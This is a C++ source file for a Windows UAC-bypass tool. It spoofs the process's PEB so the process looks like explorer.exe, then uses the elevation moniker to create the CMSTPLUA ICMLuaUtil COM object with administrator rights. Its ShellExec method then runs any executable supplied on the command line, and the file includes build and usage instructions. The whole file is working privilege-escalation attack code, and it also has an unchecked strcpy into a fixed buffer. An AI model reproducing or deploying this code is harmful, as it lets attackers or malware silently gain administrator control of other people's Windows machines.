// x86_64-w64-mingw32-g++ CmstpElevatedCOM.cpp -static -s -w -lole32 -lntdll -o /share/CmstpElevatedCOM.exe
// Usage: .\CmstpElevatedCOM.exe [EXE ON DISK TO EXECUTE]
#include <windows.h>
#include <stdio.h>
#include <shobjidl.h>
#include <objbase.h>
#include <strsafe.h>
#include "ntos.h"

//idk lol
#define strcpy strcpy
#define wcscpy wcscpy
#define wcscat wcscat

#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE *QueryInterface)(
            __RPC__in ICMLuaUtil * This,
            __RPC__in REFIID riid,
            _COM_Outptr_  void **ppvObject);

    ULONG(STDMETHODCALLTYPE *AddRef)(
        __RPC__in ICMLuaUtil * This);

    ULONG(STDMETHODCALLTYPE *Release)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method1)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method2)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method3)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method4)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method5)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method6)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *ShellExec)(
        __RPC__in ICMLuaUtil * This,
        _In_     LPCWSTR lpFile,
        _In_opt_  LPCTSTR lpParameters,
        _In_opt_  LPCTSTR lpDirectory,
        _In_      ULONG fMask,
        _In_      ULONG nShow
        );

    HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
        __RPC__in ICMLuaUtil * This,
        _In_      HKEY hKey,
        _In_opt_  LPCTSTR lpSubKey,
        _In_opt_  LPCTSTR lpValueName,
        _In_      LPCTSTR lpValueString
        );

    HRESULT(STDMETHODCALLTYPE *Method9)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method10)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method11)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method12)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method13)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method14)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method15)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method16)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method17)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method18)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method19)(
        __RPC__in ICMLuaUtil * This);

    HRESULT(STDMETHODCALLTYPE *Method20)(
        __RPC__in ICMLuaUtil * This);

    END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
    BIND_OPTS3 bo;
    WCHAR wszCLSID[MAX_PATH] = { 0 };
    WCHAR wszMonikerName[MAX_PATH] = { 0 };
    HRESULT hr = 0;

    CoInitialize(NULL);

    StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
    hr = StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
    if (FAILED(hr))
    {
        return hr;
    }

    RtlZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hWnd;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    hr = CoGetObject(wszMonikerName, &bo, riid, ppVoid);
    return hr;
}

PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

/* enumerate modules callback handler */
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    PPEB Peb = NtCurrentPeb();
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

// Spoof PEB for elevated COM access
// Credit: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass/blob/main/ColorDataProxyUACBypass/ColorDataProxyUACBypass.cpp
int SpoofExplorer() {
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    ICMLuaUtil* CMLuaUtil = NULL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    PPEB Peb = NtCurrentPeb();
    BIND_OPTS3 bop;
    RtlAcquirePebLock();
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        wcscpy(ImageFileName, L"c:\\Windows\\");
        wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        wcscpy(CommandLine, L"explorer.exe");
    }
    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    RtlReleasePebLock();
    return 0;
}

int main(int argc, char *argv[])
{

    // check for arg
    if (argc < 2) {
        printf("No EXE supplied! Re-run the file and supply a EXE on disk as the first argument!\n");
        return 1;
    }

    // convert exe supplied via argv[1] to wchar_t pointer
    char targetEXE[100] = {0};
    strcpy(targetEXE, argv[1]);
    wchar_t* lpwszExecutable =  (wchar_t*)malloc(100);
    MultiByteToWideChar(CP_UTF8, 0, targetEXE, -1, lpwszExecutable, 100);

    // Spoof explorer.exe
    SpoofExplorer();
    printf("Successfully spoofed PEB for explorer.exe\n");

    HRESULT hr = 0;
    CLSID clsidICMLuaUtil = { 0 };
    IID iidICMLuaUtil = { 0 };
    ICMLuaUtil *CMLuaUtil = NULL;
    BOOL bRet = FALSE;

    do {
        CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
        IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

        // elevate to administrator
        hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
        if (FAILED(hr))
        {
            break;
        }
        printf("Successfully created elevated CMLuaUtil COM object\n");

        // execute supplied exe via elevated com
        printf("Calling ShellExec method from the elevated CMLuaUtil COM object...\n");
        hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
        if (FAILED(hr))
        {
            break;
        }

        bRet = TRUE;
    } while (FALSE);

    free(lpwszExecutable);

    if (CMLuaUtil)
    {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (bRet == TRUE) {
        printf("ShellExec executed successfully!\n");
    } else {
        printf("ShellExec failed!\n");
    }
    
    return 0;
}